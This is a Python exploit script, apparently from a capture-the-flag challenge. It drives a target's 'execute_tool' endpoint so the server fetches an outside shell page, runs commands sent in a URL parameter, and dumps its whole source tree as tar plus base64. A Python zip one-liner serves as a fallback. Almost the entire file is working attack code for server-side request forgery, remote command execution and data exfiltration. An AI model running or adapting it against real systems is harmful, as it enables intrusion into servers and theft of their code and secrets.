import requests
import json
import base64
import re
import os
import urllib.parse
import ast

# Configuration
EXPLOT_URL = "https://video.hddpka.cn/shell.html"
TARGET_API = "http://cloud-middle.hgame.vidar.club:30411/execute_tool"

def get_cmd_output(cmd):
    final_url = f"{EXPLOT_URL}?c={urllib.parse.quote(cmd)}"
    payload = {
        "name": "py_request",
        "arguments": {
            "url": final_url
        }
    }
    
    try:
        resp = requests.post(TARGET_API, json=payload, headers={"Content-Type": "application/json"})
        if resp.status_code != 200:
            print(f"[-] HTTP Error: {resp.status_code}")
            return None
            
        res_json = resp.json()
        if res_json.get("code") != 1:
            print(f"[-] API Error Code: {res_json}")
            return None
            
        raw_inner = res_json.get("result", "")
        inner_json = json.loads(raw_inner)
        page_content = inner_json.get("content", "")
        
        if "|||RESULT_START|||" in page_content:
            start = page_content.find("|||RESULT_START|||") + len("|||RESULT_START|||")
            end = page_content.find("|||RESULT_END|||")
            result_str = page_content[start:end]
            
            # The result is a python dict string: "{'subprocess': ..., 'output': '...'}"
            # Due to python printing, it might be messy.
            # print("DEBUG RAW:", result_str[:200])

            try:
                # The issue is the subprocess module repr contains < ... > which might be messing up things or just quotes
                # Also AST eval is strict on syntax
                # Let's try to just split by 'output': ' and take the rest
                if "'output': '" in result_str:
                    parts = result_str.split("'output': '")
                    if len(parts) > 1:
                        val = parts[1]
                        # Remove trailing '}'
                        if val.endswith("'}"):
                            return val[:-2]
                        elif val.endswith("'"): # Sometimes just ' if no other keys
                            return val[:-1]
                        return val
                
                res_dict = ast.literal_eval(result_str)
                if isinstance(res_dict, dict) and 'output' in res_dict:
                    return res_dict['output']
                elif 'res' in res_dict: # fallback for dump_files.html template if used as shell
                     return res_dict['res']
                return result_str
            except:
                return result_str
        else:
            print("[-] Marker not found")
            return None
            
    except Exception as e:
        print(f"[-] Exception: {e}")
        return None

def download_source():
    print("[*] Attempting to dump source code...")
    # Try tar + base64 first as it is cleaner
    cmd = "tar -czf - . | base64 -w0"
    print(f"[*] Executing: {cmd}")
    
    output = get_cmd_output(cmd)
    
    # Clean up output if it contains dictionary repr
    if output and output.startswith("{"):
         try:
             res_dict = ast.literal_eval(output)
             if isinstance(res_dict, dict):
                 if 'output' in res_dict:
                    output = res_dict['output']
         except: pass

    if output and "command not found" not in output and "Error" not in output:
        print("[+] Received data (tar+base64).")
    else:
        print("[-] tar/base64 failed, trying python one-liner...")
        # fallback to python zip
        # carefully constructed to avoid quoting hell. 
        # actually, since we are inside a python string in the HTML, specific chars might be issues.
        # But let's try a simple recursive zip
        py_cmd = "python3 -c \"import os,zipfile,io,base64;b=io.BytesIO();z=zipfile.ZipFile(b,'w',zipfile.ZIP_DEFLATED);[z.write(os.path.join(r,f),os.path.relpath(os.path.join(r,f),'.')) for r,d,f in os.walk('.') for f in f];z.close();print(base64.b64encode(b.getvalue()).decode())\""
        print(f"[*] Executing: {py_cmd}")
        output = get_cmd_output(py_cmd)

    if not output:
        print("[-] Failed to get output.")
        return

    # print("DEBUG length:", len(output))
    # print("DEBUG head:", output[:50])
    # print("DEBUG tail:", output[-50:])
    
    # Decode
    try:
        # Clean up output (remove newlines if any and quotes)
        b64_data = output.replace("\n", "").replace(" ", "").replace("\\n", "")
        if b64_data.endswith("'}"): b64_data = b64_data[:-2] # Handle '} case
        if b64_data.endswith("'"): b64_data = b64_data[:-1]
        
        # Only keep valid base64 chars
        import re
        b64_data = re.sub(r'[^a-zA-Z0-9+/=]', '', b64_data)

        # Add padding if needed
        missing_padding = len(b64_data) % 4
        if missing_padding:
            b64_data += '='* (4 - missing_padding)

        # Validate base64 string
        # If it still fails, it might be corrupted by python repr escaping like \\n or \\'
        # The raw output shown ends with '...E', so maybe trailing chars?
        
        # Try to fix truncated output if any known marker is missing? No.
        
        zip_data = base64.b64decode(b64_data)
        
        filename = "server_dump.tar.gz"
        with open(filename, "wb") as f:
            f.write(zip_data)
            
        print(f"[+] Saved dump to {filename}")
        
        # Untar
        extract_path = "ServerSource"
        if not os.path.exists(extract_path):
            os.makedirs(extract_path)
            
        import tarfile
        if tarfile.is_tarfile(filename):
            with tarfile.open(filename, 'r:gz') as tar:
                tar.extractall(extract_path)
        else:
            print("[-] Not a valid tar file")
            return
            
        print(f"[+] Extracted to folder: {extract_path}")
        print("[+] Listing files:")
        for root, dirs, files in os.walk(extract_path):
            level = root.replace(extract_path, '').count(os.sep)
            indent = ' ' * 4 * (level)
            print(f"{indent}{os.path.basename(root)}/")
            subindent = ' ' * 4 * (level + 1)
            for f in files:
                print(f"{subindent}{f}")
                
    except Exception as e:
        print(f"[-] Error processing zip: {e}")
        print("Raw output (truncated):", output[:100])

if __name__ == "__main__":
    download_source()
